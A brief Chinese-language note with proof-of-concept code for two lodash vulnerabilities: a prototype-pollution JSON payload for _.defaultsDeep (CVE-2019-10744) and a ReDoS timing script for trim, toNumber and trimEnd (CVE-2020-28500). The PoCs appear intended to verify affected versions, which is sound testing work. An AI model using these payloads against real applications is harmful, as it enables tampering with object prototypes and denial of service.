

# lodash原型污染漏洞(CVE-2019-10744)

version<4.17.12
# POC

```
_.VERSION


const payload = '{"constructor": {"prototype": {"whoami": "Vulnerable"}}}'

_.defaultsDeep({}, JSON.parse(payload))
```

# 


# 正则表达式拒绝服务 (ReDoS) 的攻击(CVE-2020-28500)

version<4.17.21

# POC

```
_.VERSION

var lo = require('lodash');

function build_blank (n) {
var ret = "1"
for (var i = 0; i < n; i++) {
ret += " "
}

return ret + "1";
}

var s = build_blank(50000)
var time0 = Date.now();
lo.trim(s)
var time_cost0 = Date.now() - time0;
console.log("time_cost0: " + time_cost0)

var time1 = Date.now();
lo.toNumber(s)
var time_cost1 = Date.now() - time1;
console.log("time_cost1: " + time_cost1)

var time2 = Date.now();
lo.trimEnd(s)
var time_cost2 = Date.now() - time2;
console.log("time_cost2: " + time_cost2)
```

# 
